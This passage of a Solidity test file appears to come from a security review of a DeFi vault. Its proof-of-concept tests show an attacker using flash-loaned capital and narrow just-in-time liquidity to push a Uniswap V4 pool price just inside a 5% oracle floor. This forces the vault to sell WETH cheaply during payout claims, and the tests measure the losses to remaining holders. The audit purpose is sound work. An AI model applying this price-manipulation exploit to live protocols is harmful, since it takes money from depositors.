        int256 cost = _roundTripCost(legs);
        pre = _book();
        uint256 g = gasleft();
        ICoreVault.PayoutReceipt memory r = attacker.attack(legs, core, "");
        uint256 gas = g - gasleft();
        post = _book();
        _logOutcome(title, r, gas);
        console2.log("round trip alone costs the attacker (USD 6dp)");
        console2.logInt(cost);
        profit = int256(post.attacker) - int256(pre.attacker);
    }

    /// @dev e5c778a: +60,966 for the attacker on a 100,000 position in a pool as deep as the V3 pool.
    function test_REVIEW_C01_deepPool_fundPosition100k() public {
        int256 profit = _deepPoolAttack(V4_VALUE, "deep pool (L 3.8e18), fund position 100,000");
        assertEq(hubSpoke.positions().length, 2, "position kept");
        assertLt(profit, 0, "the round trip is pure cost");
    }

    /// @dev Measurement, unchanged in sign (e5c778a: -19,438 for the attacker).
    function test_REVIEW_C01_measure_deepPool_fundPosition10k() public {
        int256 profit = _deepPoolAttack(10_000e6, "deep pool (L 3.8e18), fund position 10,000");
        assertLt(profit, 0, "a small LP in a deep pool is not worth the round trip");
    }

    // ------------------------------------------------------------------ 8. S-2 residual: pushes inside the 5% floor

    /// @dev Sizes of the review's partial-exit runs: Alice 250,000, attacker stake 60,000 (an Instant request for its
    ///      whole value), Free Idle 25,000, one +-5% V4 position of 100,000, the rest (about 185,000) in Aave. So the
    ///      claim needs about 35,000 of unwind from the V4 step. Flash capital: 100 WETH and 200,000 USDC.
    uint256 internal constant RESIDUAL_STAKE = 60_000e6;

    struct Row {
        bool ran;
        uint256 proceeds;
        uint256 wethSold;
        uint256 usdcOut;
        uint256 alice;
        uint256 attacker;
    }

    /// @dev sqrtPriceX96 of the pool `bps` under the oracle price.
    function _sqrtUnderOracle(uint256 bps) internal view returns (uint160) {
        return SafeCast.toUint160(Math.mulDiv(_oracleSqrtPrice(), Math.sqrt((10_000 - bps) * 1e14), 1e9));
    }

    /// @dev A push to `pushTo` with USDC-only liquidity over the two tick spacings just under it, able to buy
    ///      `wethCapacity` WETH there: the attacker buys the vault's WETH itself at about the pushed price.
    function _narrowJitLeg(uint160 pushTo, uint256 wethCapacity) internal view returns (PoolActor.Leg memory leg) {
        leg = _pushLeg(hubKey, ARB_V4_STATE_VIEW, pushTo);
        leg.jitHi = _floorTick(TickMath.getTickAtSqrtPrice(pushTo), hubKey.tickSpacing);
        leg.jitLo = leg.jitHi - 2 * hubKey.tickSpacing;
        uint256 budget = Math.mulDiv(Math.mulDiv(pushTo, pushTo, 1 << 96), wethCapacity, 1 << 96) + 1e6;
        leg.jitLiq = LiquidityAmounts.getLiquidityForAmount1(
            TickMath.getSqrtPriceAtTick(leg.jitLo), TickMath.getSqrtPriceAtTick(leg.jitHi), budget
        );
    }

    /// @dev A whole attack transaction; one that reverts (a failed unwind with nothing payable from Free Idle reverts
    ///      the claim `InsufficientFreeIdle`) leaves the state as it was.
    function _measureRow(PoolActor.Leg[] memory legs) internal returns (Row memory row) {
        vm.recordLogs();
        try attacker.attack(legs, core, "") returns (ICoreVault.PayoutReceipt memory r) {
            _readUnwindEvents(vm.getRecordedLogs());
            row.ran = !unwindFailed && r.unwindProceeds != 0;
            row.proceeds = r.unwindProceeds;
        } catch {
            vm.getRecordedLogs();
            (swapIn, swapOut) = (0, 0);
            console2.log("  (the attack transaction reverted as a whole)");
        }
        row.wethSold = swapIn;
        row.usdcOut = swapOut;
        row.alice = _holderValue(alice);
        row.attacker = _wealth(address(attacker));
    }

    function _logRow(string memory variant, uint256 bps, Row memory row, Row memory honest) internal view {
        console2.log("----- push under the oracle (bps), variant", bps, variant);
        console2.log("  unwind ran / proceeds", row.ran ? 1 : 0, row.proceeds);
        console2.log("  WETH sold / USDC out", row.wethSold, row.usdcOut);
        if (row.wethSold != 0) {
            console2.log(
                "  sale vs oracle (ppm)", Math.mulDiv(row.usdcOut, 1e24, Math.mulDiv(row.wethSold, _oracle(), 1))
            );
        }
        console2.log("  Alice vs honest claim (6dp)");
        console2.logInt(int256(row.alice) - int256(honest.alice));
        console2.log("  attacker vs honest claim (6dp)");
        console2.logInt(int256(row.attacker) - int256(honest.attacker));
    }

    /// @dev One push depth, three runs from the same state: the honest claim (followed by the attacker arbitraging the
    ///      pool back to its start price, so the comparison isolates the manipulation), the push with narrow liquidity
    ///      under the pushed price, and the push alone (the sale fills against the pool's own liquidity). The claim is
    ///      the attacker's whole value; the comparison with the honest claim nets the Payout Fee and the flow fee out
    ///      whenever the unwind ran (same gross paid).
    /// @dev The attacker's wealth (flash capital at the oracle plus its shares at the Share Price) right before the
    ///      claim of the last `_residual` run.
    uint256 internal attackerBefore;

    function _residual(uint256 bps, uint256 stake, uint256 buffer, ICoreVault.PayoutMode mode, uint256 jitWeth)
        internal
        returns (Row memory honest, Row memory jit, Row memory native)
    {
        _setUpFund(50_000, 50_000, V4_VALUE, buffer, stake);
        attacker.requestPayout(core, _holderValue(address(attacker)), mode);
        if (mode == ICoreVaultPayouts.PayoutMode.Standard) _advance(72 hours + 1);
        _fund(FLASH_WETH, 200_000e6);
        uint160 start = hubSqrtP0Now();
        uint160 pushTo = _sqrtUnderOracle(bps);
        require(pushTo < start, "push below the start price");
        uint256 aliceBefore = _holderValue(alice);
        attackerBefore = _wealth(address(attacker));

        uint256 snap = vm.snapshotState();
        {
            vm.recordLogs();
            ICoreVault.PayoutReceipt memory r = attacker.claim(core, "");
            _readUnwindEvents(vm.getRecordedLogs());
            if (hubSqrtP0Now() < start) attacker.swapTo(hubKey, false, start);
            honest = Row(r.unwindProceeds != 0, r.unwindProceeds, swapIn, swapOut, 0, 0);
            honest.alice = _holderValue(alice);
            honest.attacker = _wealth(address(attacker));
        }
        vm.revertToState(snap);
        PoolActor.Leg memory jitLeg = _narrowJitLeg(pushTo, jitWeth);
        {
            uint256 wethBefore = IERC20(ARB_WETH).balanceOf(address(attacker));
            attacker.swapTo(hubKey, true, pushTo);
            console2.log(
                "attacker capital: WETH sold for the push", wethBefore - IERC20(ARB_WETH).balanceOf(address(attacker))
            );
            console2.log(
                "attacker capital: USDC budget of the narrow liquidity",
                Math.mulDiv(Math.mulDiv(pushTo, pushTo, 1 << 96), jitWeth, 1 << 96)
            );
        }
        vm.revertToState(snap);
        snap = vm.snapshotState();
        jit = _measureRow(_one(jitLeg));
        vm.revertToState(snap);
        native = _measureRow(_one(_pushLeg(hubKey, ARB_V4_STATE_VIEW, pushTo)));

        console2.log("===== S-2 residual, +-5% position of 100,000; stake / Free Idle", stake, buffer);
        console2.log("Standard claim (1) or Instant (0)", mode == ICoreVaultPayouts.PayoutMode.Standard ? 1 : 0);
        console2.log(
            "start price vs oracle (ppm)",
            Math.mulDiv(Math.mulDiv(start, start, 1 << 96), 1e24, Math.mulDiv(_oracle(), 1 << 96, 1))
        );
        console2.log("honest claim: proceeds / WETH sold / USDC out", honest.proceeds, honest.wethSold, honest.usdcOut);
        console2.log("honest claim: Alice change, attacker change vs before the claim");
        console2.logInt(int256(honest.alice) - int256(aliceBefore));
        console2.logInt(int256(honest.attacker) - int256(attackerBefore));
        _logRow("narrow liquidity under the push", bps, jit, honest);
        console2.log("  attacker change vs before the claim (6dp)");
        console2.logInt(int256(jit.attacker) - int256(attackerBefore));
        _logRow("sale into the pool's own liquidity", bps, native, honest);
    }

    function _residual(uint256 bps) internal returns (Row memory honest, Row memory jit, Row memory native) {
        return _residual(bps, RESIDUAL_STAKE, BUFFER, ICoreVaultPayouts.PayoutMode.Instant, 40e18);
    }

    function test_REVIEW_C01_measure_floorResidual_push100bps() public {
        _residual(100);
    }

    function test_REVIEW_C01_measure_floorResidual_push200bps() public {
        _residual(200);
    }

    function test_REVIEW_C01_measure_floorResidual_push300bps() public {
        _residual(300);
    }

    function test_REVIEW_C01_measure_floorResidual_push400bps() public {
        _residual(400);
    }

    function test_REVIEW_C01_measure_floorResidual_push450bps() public {
        _residual(450);
    }

    /// @dev The pin: just inside the floor, the claimant's empty-hint claim still makes the fund sell its WETH about
    ///      4.9% under the oracle; the holder who stays pays, the claimant keeps most of it.
    function test_POC_REVIEW_C01_floorResidual_push480bps() public {
        (Row memory honest, Row memory jit,) = _residual(480);
        assertTrue(jit.ran, "the floor lets a 4.8% push through");
        assertGe(jit.usdcOut, Math.mulDiv(jit.wethSold, _oracle(), 1e18) * 95 / 100, "sale above the oracle floor");
        assertLt(jit.usdcOut, Math.mulDiv(jit.wethSold, _oracle(), 1e18) * 96 / 100, "sale over 4% under the oracle");
        assertGt(honest.alice, jit.alice + 700e6, "the holder who stays loses over 700 USDC against an honest claim");
        assertGt(jit.attacker, honest.attacker + 600e6, "the claimant keeps over 600 USDC over an honest claim");
    }

    function test_REVIEW_C01_measure_floorResidual_push490bps() public {
        _residual(490);
    }

    /// @dev Same push, Standard claim after its term (no Payout Fee): the claimant leaves with more than its shares
    ///      were worth right before the claim, and the cycle costs only the two flow fees (25 bps each way at the
    ///      scripts' value), so it repeats whenever the manager allocates the re-deposited stake.
    function test_POC_REVIEW_C01_floorResidual_push480bps_standardClaimExitsAboveItsShareValue() public {
        (Row memory honest, Row memory jit,) =
            _residual(480, RESIDUAL_STAKE, BUFFER, ICoreVaultPayouts.PayoutMode.Standard, 40e18);
        assertTrue(jit.ran, "the floor lets a 4.8% push through");
        assertGt(jit.attacker, honest.attacker + 600e6, "over 600 USDC above an honest Standard exit");
        assertGt(jit.attacker, attackerBefore, "the claimant leaves with more than its shares were worth");
    }

    /// @dev Scale: Free Idle 0 and a 100,000 stake, so the claim needs the whole V4 position and the rest comes from
    ///      Aave; the loss grows with the WETH the unwind sells (narrow liquidity for 100 WETH under the push).
    function test_REVIEW_C01_measure_floorResidual_push400bps_wholePosition() public {
        _residual(400, 100_000e6, 0, ICoreVaultPayouts.PayoutMode.Instant, 100e18);
    }

    function test_REVIEW_C01_measure_floorResidual_push450bps_wholePosition() public {
        _residual(450, 100_000e6, 0, ICoreVaultPayouts.PayoutMode.Instant, 100e18);
    }
}
